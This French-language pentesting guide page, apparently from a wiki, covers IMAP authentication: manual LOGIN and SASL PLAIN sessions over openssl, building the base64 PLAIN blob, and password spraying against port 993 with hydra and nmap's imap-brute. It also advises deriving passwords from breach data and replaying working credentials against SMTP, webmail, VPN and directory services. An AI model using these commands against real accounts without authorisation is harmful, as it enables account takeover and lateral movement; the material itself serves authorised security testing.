---
title: "Authentification : se connecter et sprayer des identifiants IMAP"
description: "S'authentifier auprès d'IMAP : LOGIN en clair sur 143, SASL AUTHENTICATE PLAIN/LOGIN/CRAM-MD5 à la main, construction du blob base64 PLAIN, et spraying de mots de passe en ligne avec hydra et nmap contre 993. Lit un a OK par rapport à un NO et explique ce que LOGINDISABLED impose."
keywords:
  - imap login
  - authenticate plain
  - cram-md5
  - imap password spray
  - hydra imap
---

# Authentification

IMAP offre deux voies d'entrée. `LOGIN user pass` envoie les identifiants en clair et c'est ce qu'utilisent la plupart des clients une fois qu'un canal TLS existe (993, ou 143 après STARTTLS). `AUTHENTICATE <mechanism>` exécute un échange SASL : `PLAIN` et `LOGIN` transportent toujours le mot de passe (en base64, pas chiffré), tandis que `CRAM-MD5` est un défi-réponse qui n'envoie jamais le mot de passe lui-même. Un `a OK ... LOGIN completed` étiqueté correspond à un identifiant fonctionnel ; un `a NO` est un rejet. Comme les comptes de boîte aux lettres sont fréquemment les mêmes comptes d'annuaire utilisés ailleurs, tout succès est immédiatement matière à réutilisation.

## Conditions préalables

Exécutez d'abord `CAPABILITY` ([énumération](enumeration.md)). Si `LOGINDISABLED` est présent sur une connexion 143 en clair, `LOGIN` renvoie `a NO` jusqu'à ce que vous négociiez STARTTLS, alors émettez `a STARTTLS` et renégociez, ou utilisez simplement 993. Les jetons `AUTH=` vous indiquent quels mécanismes `AUTHENTICATE` seront acceptés.

## Connexion manuelle

```bash
openssl s_client -connect <target>:993 -quiet
a LOGIN alice 'Sprint2025!'
a OK [CAPABILITY IMAP4rev1 ...] Logged in
```

Ici, `a OK` est un identifiant valide et une session active que vous pouvez immédiatement diriger vers l'[accès à la boîte aux lettres](mailbox-access.md). `a NO [AUTHENTICATIONFAILED]` signale un mauvais mot de passe ou un utilisateur inconnu.

## AUTHENTICATE PLAIN à la main

SASL PLAIN est la chaîne `authzid\0authcid\0password` (l'identité d'autorisation est normalement laissée vide) encodée en base64. Construisez-la et transmettez-la à `AUTHENTICATE PLAIN` :

```bash
# authzid is empty, authcid=alice, password=Sprint2025!
printf '\0alice\0Sprint2025!' | base64
# -> AGFsaWNlAFNwcmludDIwMjUh
openssl s_client -connect <target>:993 -quiet
a AUTHENTICATE PLAIN
+
AGFsaWNlAFNwcmludDIwMjUh
a OK Logged in
```

Le `+` seul est l'invite de continuation du serveur demandant le blob base64. Avec la capacité `SASL-IR`, vous pouvez l'inclure en une seule ligne : `a AUTHENTICATE PLAIN AGFsaWNlAFNwcmludDIwMjUh`. `AUTHENTICATE LOGIN` invite en revanche deux fois, une fois pour le nom d'utilisateur en base64 et une fois pour le mot de passe en base64. `CRAM-MD5` envoie un défi en base64 auquel vous répondez par `username <espace> HMAC-MD5(challenge, password)` en hexadécimal, il n'est donc devinable que hors ligne si vous capturez une paire défi/réponse.

## Spraying

Restez lent et validé par nom d'utilisateur ; les serveurs journalisent chaque échec et peuvent limiter le débit ou bannir en cas de rafales.

```bash
# one password across validated users, implicit TLS on 993
hydra -L users.txt -p 'Sprint2025!' -s 993 -S <target> imap -t 4 -f
# single high-value account, short contextual list
hydra -l admin -P top-passwords.txt -s 993 -S <target> imap -t 4 -f
# nmap's IMAP brute module as an alternative driver
nmap -p993 --script imap-brute --script-args userdb=users.txt,passdb=pass.txt <target>
```

`-S` indique à hydra d'utiliser le SSL/TLS implicite (993) ; retirez-le pour le 143 en clair et ajoutez la gestion STARTTLS que le serveur exige. Dérivez les mots de passe de l'organisation (saison+année, nom de l'entreprise, données de fuite) plutôt que d'une liste générique gigantesque : les limites de type `MaxAuthTries` et fail2ban rendent la force brute large contre-productive, et un spraying contextuel court aboutit bien plus fiablement.

## Suite

Un identifiant fonctionnel mène directement à l'[accès à la boîte aux lettres](mailbox-access.md), et devrait être rejoué contre la soumission SMTP, OWA/webmail, le VPN et l'annuaire, puisque le même mot de passe les déverrouille généralement tous.

## Outils

- [hydra](https://github.com/vanhauser-thc/thc-hydra)
- [nmap imap-brute](https://nmap.org/nsedoc/scripts/imap-brute.html)

## Références

- [RFC 4616 : mécanisme SASL PLAIN](https://datatracker.ietf.org/doc/html/rfc4616)
- [RFC 2195 : CRAM-MD5](https://datatracker.ietf.org/doc/html/rfc2195)
- [HackTricks : pentesting IMAP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-imap.html)
